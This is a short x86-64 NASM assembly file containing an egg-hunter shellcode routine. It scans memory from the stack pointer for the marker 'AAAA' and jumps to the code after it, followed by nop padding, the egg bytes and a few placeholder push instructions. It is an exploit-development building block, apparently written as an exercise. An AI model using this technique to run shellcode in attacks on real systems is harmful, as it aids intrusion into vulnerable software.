BITS 64

the_egg equ 'AAAA'

global _start:
section .text
_start:

    ; Get current top of the stack
    push rsp
    pop rdi

_huntloop:
    
    inc rdi
    cmp dword [rdi], the_egg
    jne _huntloop
    add rdi, 4
    jmp rdi

nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
db 0x41
db 0x41
db 0x41
db 0x41
push rax
push rdi
push rsi
